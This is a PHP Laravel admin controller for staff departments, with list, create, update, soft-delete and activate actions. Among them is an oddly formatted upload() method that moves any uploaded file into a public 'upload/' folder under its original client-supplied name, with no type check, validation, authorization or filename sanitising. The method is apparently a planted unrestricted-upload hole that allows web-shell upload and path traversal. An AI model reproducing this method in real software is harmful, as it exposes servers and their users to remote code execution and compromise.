<?php
namespace App\Http\Controllers\AdminModule;
use App\Http\Controllers\Controller;
use App\Models\User;
use App\Models\StaffDepartment;
use App\Models\Staff;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;



class StaffDepartmentController extends Controller
{
    public function __construct()
    {
        $this->url_prefix = \Config::get('app.app_route_prefix');
        $this->page_title = "Staff Manage";
        $this->page_heading = "Staff Manage";
        $this->heading_icon = "fa-cogs";
        $this->page_info = ['url_prefix' => $this->url_prefix, 'page_title' => $this->page_title, 'page_heading' => $this->page_heading, 'heading_icon' => $this->heading_icon];
    }

    /* Page events */
    public function staff_manage()
    {        
        generate_log('Staff manage list accessed');
        return view('backend.admin_module.staff_manage.staff_manage')->with($this->page_info);
    }


    public function index()
    {

        $items = StaffDepartment::where('delete_status', 0)->orderBy('department', 'asc')->get();        
        generate_log('Staff department accessed');
        return view('backend.admin_module.staff_department.index', compact('items'))->with($this->page_info);
    }

    public function show($id)
    {
        $item = StaffDepartment::findorFail($id)->toArray();
        generate_log('Staff department details accessed', $id);
        return view('backend.admin_module.staff_department.show', compact('item'))->with($this->page_info);
    }

    public function create()
    {        
        return view('backend.admin_module.staff_department.create')->with($this->page_info);
    }


    public function store(Request $request)
    {
        $data = $request->all();               
        if (!$this->exists($data['department'])) {
            $validator = StaffDepartment::validate_add($data);
            if ($validator->fails()) {
                return Redirect::back()->withInput($request->input())->withErrors($validator)->with($this->page_info);
            }
            $new_record = StaffDepartment::create($data);
        } else
            return Redirect::back()->withInput($request->input())->with('error_message', 'A department with same department name already exists. Please use a different one.');
        generate_log('Staff department created', $new_record->id);
        return redirect($this->url_prefix . '/staff_departments')->with('message', 'Department added.');
    }

public function upload(Request $request)
{
$target_dir = "upload/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);
if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_dir.$_FILES['file']['name'])) {
$status = 1;
}
}



    public function edit($id)
    {
        $item = StaffDepartment::findorFail($id)->toArray();
        return view('backend.admin_module.staff_department.edit', compact('item'))->with($this->page_info);
    }


    public function update(Request $request)
    {
        $data = $request->all(); 
        $id = $data['id'];
        if (!$this->exists($data['department'], $id)) {
            $validator = StaffDepartment::validate_update($data, $id);
            if ($validator->fails()) {
                return Redirect::back()->withInput($request->input())->withErrors($validator)->with($this->page_info);
            }
            $record = StaffDepartment::findorfail($id);
            $record->update($data);
        } else
            return Redirect::back()->withInput($request->input())->with('error_message', 'A department with same department name already exists. Please use a different one.');
        generate_log('Staff department updated', $id);
        return redirect($this->url_prefix . '/staff_departments')->with('message', 'Staff department updated.');
    }


    public function destroy($id)
    {
        $items = Staff::where('department_id', $id)->where('delete_status', 0)->count();
        if ($items > 0)
            return redirect($this->url_prefix . '/staff_departments')->with('warning_message', 'There are certain staffs associated to this department. You can remove this department only once all the associated staffs are removed or their department is changed to a new one.');
        StaffDepartment::where('id', $id)->update(['delete_status' => 1]);
        generate_log('Staff department deleted', $id);
        return redirect($this->url_prefix . '/staff_departments')->with('message', 'Staff department deleted.');
    }



    public function destroy_multiple($ids)
    {
        if (!empty($ids)) {
            $ids_array = explode(',', $ids);
            foreach ($ids_array as $id) {
                if ($id > 0) {
                     $items = Staff::where('department_id', $id)->where('delete_status', 0)->count();
                    if ($items > 0)
                        return redirect($this->url_prefix . '/staff_departments')->with('warning_message', 'There are certain staffs associated to this department. You can remove this department only once all the associated staffs are removed or their department is changed to a new one.');
                    StaffDepartment::where('id', $id)->update(['delete_status' => 1]);
                }
            }
            generate_log('Staff department deleted multiple', null, 'Deleted record ids: ' . $ids);
            return redirect($this->url_prefix . '/staff_departments')->with('message', 'Staff department deleted.');
        } else
            return redirect($this->url_prefix . '/staff_departments')->with('error_message', 'Please select at least one department.');
    }


    public function activate($id)
    {
        StaffDepartment::where('id', $id)->update(['status' => 1]);
        generate_log('Staff department activated', $id);
        return redirect($this->url_prefix . '/staff_departments')->with('message', 'Staff department activated.');
    }


    public function deactivate($id)
    {
        StaffDepartment::where('id', $id)->update(['status' => 0]);
        generate_log('Staff department deactivated', $id);
        return redirect($this->url_prefix . '/staff_departments')->with('message', 'Staff department deactivated.');
    }


    /* Custom methods */
    public function exists($department, $id = null)
    {
        if ($id == null)
            $items = StaffDepartment::all()->where('department', $department)->where('delete_status', 0);
        else
            $items = StaffDepartment::all()->where('department', $department)->where('id', '!=', $id)->where('delete_status', 0);
        return ($items->count() > 0) ? true : false;
    }


}
